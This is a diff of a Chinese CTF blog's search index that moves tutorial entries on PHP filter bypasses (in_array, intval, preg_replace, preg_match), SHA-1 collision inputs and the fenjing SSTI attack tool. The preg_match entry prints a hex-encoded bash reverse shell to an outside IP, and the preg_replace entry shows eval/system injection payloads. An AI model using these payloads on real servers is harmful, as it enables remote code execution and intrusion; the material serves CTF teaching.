@@ -129,31 +129,6 @@
       </tags>
   </entry>
   <entry>
-    <title>fenjing</title>
-    <url>/2024/06/05/fenjing/</url>
-    <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
-<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在windows环境下安装最方便，本人尝试在kali安装失败了很多次，各种报错，最后放弃了。&emsp;(；′⌒&#96;)</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
-
-<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;该命令执行完毕后会反弹一个shell</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;会在本地弹出一个可视化操作页面，然后在根据要求填充和执行（方便新手去使用）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>
-
-<p> &emsp;&emsp;一把梭（说实话还是上面两个命令好用些(／_＼)大怨种）</p>
-<p> &emsp;更为详细的在 <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
-]]></content>
-      <categories>
-        <category>SSTI</category>
-      </categories>
-      <tags>
-        <tag>工具|脚本 利用</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>dirsearch</title>
     <url>/2024/07/23/dirsearch/</url>
     <content><![CDATA[<p>&emsp;&emsp;dirsearch用来暴力扫描一些基础的存在目录和文件，实用指数:⭐⭐⭐⭐,kali安装:</p>
@@ -190,6 +165,31 @@
       </tags>
   </entry>
   <entry>
+    <title>fenjing</title>
+    <url>/2024/06/05/fenjing/</url>
+    <content><![CDATA[<h2 id="Fenjing-焚靖"><a href="#Fenjing-焚靖" class="headerlink" title="Fenjing(焚靖)"></a>Fenjing(焚靖)</h2><h3 id="fenjing介绍"><a href="#fenjing介绍" class="headerlink" title="fenjing介绍"></a>fenjing介绍</h3><p>&emsp;&emsp;焚靖是一个针对CTF比赛中Jinja2 SSTI绕过WAF的全自动脚本，可以自动攻击给定的网站或接口。能解决常规性的SSTI题目，实用指数⭐⭐⭐</p>
+<h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><p>&emsp;&emsp;在windows环境下安装最方便，本人尝试在kali安装失败了很多次，各种报错，最后放弃了。&emsp;(；′⌒&#96;)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install fenjing -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing scan --url &lt;URL:&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;该命令执行完毕后会反弹一个shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing webui</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;会在本地弹出一个可视化操作页面，然后在根据要求填充和执行（方便新手去使用）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m fenjing crack --url &lt;URL:&gt; --method GET(POST) --inputs name(user)</span><br></pre></td></tr></table></figure>
+
+<p> &emsp;&emsp;一把梭（说实话还是上面两个命令好用些(／_＼)大怨种）</p>
+<p> &emsp;更为详细的在 <a href="https://gitcode.com/Marven11/Fenjing">here</a></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>工具|脚本 利用</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>hackbar</title>
     <url>/2024/07/13/hackbar/</url>
     <content><![CDATA[<p>&emsp;&emsp;hackbar是一个用于谷歌和火狐浏览器的扩展插件，可以在浏览器的扩展直接下载添加，然后按F12即可，具体使用方法和操作可以在网上搜一抓一大把，(建议下载cracked&amp;fixed版本的，新版本好像要激活码还是什么的)我这里只做一个指路引导的作用。（Ｕ・ω・）⊃<br>&emsp;&emsp; 我们可以通过它进行自定义发送，手动构造GET,POST和COOKIE管理等方法，还具备有URL编码，base64编码，MD5加密 等的能力，还有很多功能等你慢慢沉淀挖掘，实用指数⭐⭐⭐⭐⭐</p>
@@ -209,25 +209,6 @@
 <h3 id="in-array缺陷"><a href="#in-array缺陷" class="headerlink" title="in_array缺陷"></a>in_array缺陷</h3><p>&emsp;&emsp;根据上面所描述的，当该函数没有设置第三个参数的时候，只会进行弱类型比较（相当于&#x3D;&#x3D;），也就是不会检查数据类型，例如<br><img data-src="/images/in_array()%E5%87%BD%E6%95%B0%E7%BC%BA%E9%99%B7.png" alt="in_array"><br>&emsp;&emsp;根据上面白名单规定，只能上传1~24的文件名，因为没有第三个参数，进行弱比较，所以我们上传3shell.php的时候，只要第一个匹配就可以了，从而绕过了白名单，达到了任意文件上传的目的。类似的还有：  </p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="number">3</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;</span><br><span class="line"><span class="variable">$whitelist</span> = <span class="title function_ invoke__">range</span>(<span class="number">1</span>,<span class="number">5</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$id</span>,<span class="variable">$whitelist</span>))</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;这里我们有没有设置第三个参数，进行弱类型比较，同样绕过了白名单，这里需要注意的是in_array的返回类型，匹配了返回什么，还有注意前面的！，在preg_match等匹配的时候有常出现，要知道它的作用。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>函数绕过</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>intval</title>
-    <url>/2024/07/12/intval/</url>
-    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
-<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;输出</p>
-<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
-<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -288,6 +269,25 @@
 <figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span></span><br><span class="line"></span><br><span class="line">array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span></span><br></pre></td></tr></table></figure>
 
 
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>intval</title>
+    <url>/2024/07/12/intval/</url>
+    <content><![CDATA[<p>&emsp;&emsp;intval()函数用来获取变量的整数值，使用的时候常见的有两种情况：<br>&emsp;1.转换整数时，返回整数本身<br>&emsp;2.转换字符串时，会从字符串的开始进行转换，直到遇到一个非数字的字符，如果字符串的第一个字符不是整数，则返回0  </p>
+<h3 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h3><p>&emsp;如果它的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>[]=1;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="built_in">echo</span> intval(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;输出</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Array1</span><br></pre></td></tr></table></figure>
+
+<h3 id="字符串绕过"><a href="#字符串绕过" class="headerlink" title="字符串绕过"></a>字符串绕过</h3><p>&emsp;&emsp;类似于’1000’,’2 or id &#x3D; 1000’的这种带单引号或者有字符的类型，intval()函数会从字符串的开始进行转换，直到遇到非数字的字符，例如第二个转换到or的时候，由于or不是数字类型的字符，从而停止转换，转换的结果就只有2。  </p>
+<h3 id="字符串类型-进制绕过"><a href="#字符串类型-进制绕过" class="headerlink" title="字符串类型&amp;进制绕过"></a>字符串类型&amp;进制绕过</h3><p><img data-src="/images/%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%9E%8B&%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87.png" alt="字符串类型&amp;进制绕过"></p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -380,26 +380,6 @@
       </tags>
   </entry>
   <entry>
-    <title>preg_replace</title>
-    <url>/2024/07/12/preg-replace/</url>
-    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
-<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
-<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
-<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
-<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-      <tags>
-        <tag>函数绕过</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>preg_match</title>
     <url>/2024/06/12/preg-match/</url>
     <content><![CDATA[<p>&emsp;&emsp;正则匹配也是php中最常见的一种，一般用来做一个<del>装饰</del>匹配作用，我们通常用以下几种绕过方式来规避正则匹配。</p>
@@ -433,6 +413,26 @@
 <h3 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h3><p>&emsp;&emsp;通过进制绕过是通用的，我们可以将指令转成十六进制，然后用php -r进行php代码执行。<br><img data-src="/images/ciscn.png" alt="ciscn"><br>&emsp;&emsp;payload</p>
 <figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">cmd</span>=php -r <span class="variable">$a</span>=substr(Z62617368202d63202262617368202d69203e26202f6465762f7463702f3132342e3232322e3133362e33332f3133333720303e263122,<span class="number">1</span>)<span class="comment">;system(hex2bin($a));</span></span><br></pre></td></tr></table></figure>
 <p>&emsp;&emsp;这段十六进制是命令<font color=blue>bash -c “bash -i&gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.136.33&#x2F;1337 0&gt;&amp;1”</font>这条命令的意思是向124.222.136.33(服务器的IP)的1337端口建立一个连接，输入(0)的内容变为命令输出(1)。之所以前面有z不属于16进制的字符存在时因为加不了引号，开头是数字的话，就会将类型识别为数字，若后续出现了字符串就会报错，所以我们要用substr将类型转为字符串。</p>
+]]></content>
+      <categories>
+        <category>PHP</category>
+      </categories>
+      <tags>
+        <tag>函数绕过</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>preg_replace</title>
+    <url>/2024/07/12/preg-replace/</url>
+    <content><![CDATA[<p>&emsp;&emsp;preg_replace 函数执行一个正则表达式的搜索和替换。相比于preg_match 函数它多了一个替换的功能（没错，说了一句废话）<br>&emsp;&emsp;通常来说，它有三个参数，preg_repalce($pattern,$repalcement,$subject);–&gt;搜索$subject中匹配$pattern的部分，并以$replacement进行替换。话不多说，看题目就懂了。<br>注：str_replace也是一样的特性，区别是正则的规则匹配</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;str&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/&#x27;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$str</span> === <span class="string">&quot;HYNUCTF&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;菜，就多练&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;既然HYNUCTF组合会变为空那么可以通过双写拼接进行绕过，原理跟sql注入的关键字绕过差不多。<br>payload：HYNU<font color=red>HYNUCTF</font>CTF<br>&emsp;&emsp;红色部分被替换成了空，那么剩下的就拼接成了是吧。</p>
+<h3 id="eval创建新变量绕过"><a href="#eval创建新变量绕过" class="headerlink" title="eval创建新变量绕过"></a>eval创建新变量绕过</h3><p>&emsp;&emsp;这是个很有用的地方，很多题型都适用这个，当遇到过滤了关键字符或者没有头绪的时候，可以使用这个方法进行创建一个新变量去执行它。<br>&emsp;&emsp;例如</p>
+<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">$str = preg_replace(<span class="string">&#x27;/system/&#x27;</span>,<span class="string">&quot;&quot;</span>,$_GET[<span class="string">&#x27;str&#x27;</span>]);</span><br><span class="line">······</span><br><span class="line">payload：  </span><br><span class="line">?str=<span class="keyword">eval</span>($_GET[<span class="string">&#x27;A&#x27;</span>]);&amp;A=<span class="keyword">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;这是利用eval执行system命令去寻找拥有flag的页面，后续同理我们可以使用GET和POST方法来进行绕过。</p>
+<h3 id="经典漏洞-e"><a href="#经典漏洞-e" class="headerlink" title="经典漏洞&#x2F;e"></a>经典漏洞&#x2F;e</h3><p>&emsp;&emsp;preg_replace函数的特性，&#x2F;e可执行模式，此为PHP专有参数，例如preg_replace函数。也就是说，它的$repalcement部分会被当做命令执行。  </p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/HYNUCTF/e&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>],<span class="string">&quot;XTWASYS&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;此时传入?str&#x3D;system(“ls”);就可执行此代码。</p>
 ]]></content>
       <categories>
         <category>PHP</category>
@@ -545,6 +545,18 @@
       </tags>
   </entry>
   <entry>
+    <title>信息收集（CTF基础篇）</title>
+    <url>/2024/07/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%88CTF%E5%9F%BA%E7%A1%80%E7%AF%87%EF%BC%89/</url>
+    <content><![CDATA[<p>&emsp;&emsp;信息收集作为CTF最常用的手段（直接给源码的不算），常规思路有<br><font color=black><br>ctrl+U 查看源代码<br>F12  查看js脚本<br>robots.txt 文件泄露,在URL后面加上&#x2F;robots.txt,可能会给出flag或所在路径<br><a href="http://www.zip/">www.zip</a>   压缩包，同上用法<br>dirsearch   扫描文件，转至<a href="/2024/07/23/dirsearch/">dirsearch</a><br>BurpSuite  抓包找响应头，转至<a href="/2024/07/25/BurpSuite/">BurpSuite</a><br></font><br>&emsp;&emsp;基本思路就这些，剩下的就靠你的搜索能力了( ੭ ˙ᗜ˙ )੭</p>
+]]></content>
+      <categories>
+        <category>WEB</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>tplmap</title>
     <url>/2024/06/06/tplmap/</url>
